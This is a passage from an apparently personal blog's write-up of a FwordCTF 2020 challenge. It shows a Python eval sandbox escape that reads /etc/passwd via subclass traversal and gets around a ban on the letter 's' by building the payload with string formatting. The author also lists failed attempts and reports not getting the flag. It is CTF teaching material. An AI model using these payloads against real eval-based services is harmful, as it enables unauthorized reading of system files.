          <code slot="code" class="css-mwukus">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()
&#x27;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nfword:x:1000:1000::/home/fword/:/bin/bash\nmessagebus:x:101:101::/nonexistent:/usr/sbin/nologin\n&#x27;</code>
        </deckgo-highlight-code><h3 class="css-4hwfb">no &#x27;s&#x27;</h3><p class="css-1yn88va">Now you can probably see why banning the letter &#x27;s&#x27; would be problematic, as the letter &#x27;s&#x27; appears in all the builtin functions we used to grab the file type.</p><p class="css-1yn88va">However, fear not, as security engineers always find a way!</p><deckgo-highlight-code language="python">
          <code slot="code" class="css-mwukus">xpirep@kali:~/dev/fword20/dir$ nc directorymanager.fword.wtf 1234
Welcome to our Directory Manager, what do you want to execute :
[dir()]
[[&#x27;__builtins__&#x27;, &#x27;__doc__&#x27;, &#x27;__file__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__warningregistry__&#x27;, &#x27;conn&#x27;, &#x27;inp&#x27;, &#x27;isallowed&#x27;, &#x27;ldap&#x27;]]</code>
        </deckgo-highlight-code><p class="css-1yn88va">I found I was able to evaluate the <code class="css-mwukus">dir()</code> function if it was contained in a list, and lo and behold! the first element of this list has the letter &#x27;s&#x27; in it~</p><p class="css-1yn88va">I grabbed this &#x27;s&#x27; to see if it would pass whatever black listing was happening behind the scenes:</p><deckgo-highlight-code language="python">
          <code slot="code" class="css-mwukus">xpirep@kali:~/dev/fword20/dir$ nc directorymanager.fword.wtf 1234
Welcome to our Directory Manager, what do you want to execute :
dir()[0][9]
s</code>
        </deckgo-highlight-code><p class="css-1yn88va">Bingo. Now, I just used the string <code class="css-mwukus">format</code> function to craft the payload shown in the previous section:</p><deckgo-highlight-code language="python">
          <code slot="code" class="css-mwukus">xpirep@kali:~/dev/fword20/dir$ nc directorymanager.fword.wtf 1234
Welcome to our Directory Manager, what do you want to execute :
[eval(&#x27;[].__cla{0}{0}__.__ba{0}e__.__{0}ubcla{0}{0}e{0}__()&#x27;.format(dir()[0][9]))[40](&#x27;/etc/pa{0}{0}wd&#x27;.format(dir()[0][9])).read()]
[&#x27;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nfword:x:1000:1000::/home/fword/:/bin/bash\nmessagebus:x:101:101::/nonexistent:/usr/sbin/nologin\n&#x27;]</code>
        </deckgo-highlight-code><p class="css-1yn88va">Although I was able to read <code class="css-mwukus">/etc/passwd</code>, as well as some other common files like <code class="css-mwukus">.bashrc</code>, without access to the <code class="css-mwukus">os</code> library, I was unnable to get a list of the directory, to know which file to target.</p><h3 class="css-4hwfb">Failures</h3><p class="css-1yn88va">I tried a lot of different things, here&#x27;s how they worked out:</p><ul class="css-1sqmp6c"><li class="css-1rk5nsg">I can <code class="css-mwukus">eval</code> but I am blacklisted from running <code class="css-mwukus">exec</code>, or running <code class="css-mwukus">eval(compile())</code>, which means I cannot import.</li><li class="css-1rk5nsg">I can use <code class="css-mwukus">__import__(os).listdirs()</code> but this is blocked from running, and black listed.
Really, I spent a few hours testing random directories and possible file names for the flag, but without access to <code class="css-mwukus">ls</code>, I am really at a loss for knowing which file to target. Hence I was unable to get the flag in the end.</li></ul></div><style data-emotion="css 1vplgj8">.css-1vplgj8{margin-top:64px;margin-bottom:64px;margin-left:auto;margin-right:auto;}</style><style data-emotion="css 1r7chrq">.css-1r7chrq{box-sizing:border-box;margin:0;min-width:0;margin-top:64px;margin-bottom:64px;margin-left:auto;margin-right:auto;}</style><div class="css-1r7chrq"><style data-emotion="css 5fg4yr">.css-5fg4yr{color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:48px;}@media screen and (min-width: 52em){.css-5fg4yr{font-size:64px;}}</style><h2 class="css-5fg4yr">Contact</h2><style data-emotion="css 1gkbje0">.css-1gkbje0{color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:20px;}@media screen and (min-width: 52em){.css-1gkbje0{font-size:24px;}}</style><h5 class="css-1gkbje0">Feel free to reach out if you&#x27;re looking for a software developer, want to connect or have a question.</h5><style data-emotion="css 1f6sakg">.css-1f6sakg{color:var(--theme-ui-colors-primary);}</style><a href="mailto:me@justinor.dev" target="_blank" rel="noopener" class="css-1f6sakg"><style data-emotion="css 1e988pp">.css-1e988pp{margin-bottom:16px;margin-top:16px;}</style><style data-emotion="css 1e6376t">.css-1e6376t{color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:20px;margin-bottom:16px;margin-top:16px;}@media screen and (min-width: 52em){.css-1e6376t{font-size:24px;}}</style><h5 class="css-1e6376t">me@justinor.dev</h5></a><a href="https://github.com/xpire" target="_blank" rel="noopener" class="css-1f6sakg"><h5 class="css-1e6376t">github/xpire</h5></a><a href="https://www.linkedin.com/in/justinor" target="_blank" rel="noopener" class="css-1f6sakg"><h5 class="css-1e6376t">linkedin/in/justinor</h5></a></div><div class="css-1r7chrq"><style data-emotion="css wo81d0">.css-wo81d0{font-weight:300;text-transform:uppercase;}</style><style data-emotion="css 178djrr">.css-178djrr{color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:20px;font-weight:300;text-transform:uppercase;}@media screen and (min-width: 52em){.css-178djrr{font-size:24px;}}</style><h5 class="css-178djrr">Â© Justin Or | Made with Gatsby, Theme-ui and MDX.</h5><header class="css-1517jte"><button class="css-x0mgp8-IconButton"><h2 class="css-otzcoq">J</h2><svg width="3em" height="3em" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="transform-origin:50% 50%"><circle cx="11.9998" cy="11.9998" r="5.75375" fill="currentColor" style="transform:scale(1.5);transform-origin:0px 0px"></circle><g style="transform:rotate(45deg);transform-origin:0px 0px"><circle cx="3.08982" cy="6.85502" r="1.71143" transform="rotate(-60 3.08982 6.85502)" fill="currentColor"></circle><circle cx="3.0903" cy="17.1436" r="1.71143" transform="rotate(-120 3.0903 17.1436)" fill="currentColor"></circle><circle cx="12" cy="22.2881" r="1.71143" fill="currentColor"></circle><circle cx="20.9101" cy="17.1436" r="1.71143" transform="rotate(-60 20.9101 17.1436)" fill="currentColor"></circle><circle cx="20.9101" cy="6.8555" r="1.71143" transform="rotate(-120 20.9101 6.8555)" fill="currentColor"></circle><circle cx="12" cy="1.71143" r="1.71143" fill="currentColor"></circle></g></svg></button><button class="css-5oct1l-IconButton"><svg viewBox="0 0 1000 1000" height="32x" width="32px"><path fill="var(--theme-ui-colors-text)" d="M230.5,499l496,491l43-54.8L284.9,444L230.5,499z"></path><path fill="var(--theme-ui-colors-text)" d="M286.6,554L750.9,64l-44.6-54L230.5,499.4L286.6,554z"></path></svg></button></header></div></div></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/blog/fword2020-ctf/";window.___webpackCompilationHash="db7a9358ed01b9dbc03b";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-bd9369fe085999bbf555.js"],"app":["/app-8bf2c68a69a3d07ce713.js"],"polyfills-dom":["/polyfills-dom-7332b207206eea44d9b8.js"],"polyfills-core-js":["/polyfills-core-js-d5339be6e51dfc11b8d8.js"]};/*]]>*/</script><script src="/polyfill-bd9369fe085999bbf555.js" nomodule=""></script><script src="/app-8bf2c68a69a3d07ce713.js" async=""></script><script src="/05d954cf-2e4067c921aee2b6a16a.js" async=""></script><script src="/framework-b4c2e49b0265e11fe0b1.js" async=""></script><script src="/webpack-runtime-dfbc60d330bf24dc7417.js" async=""></script></body></html>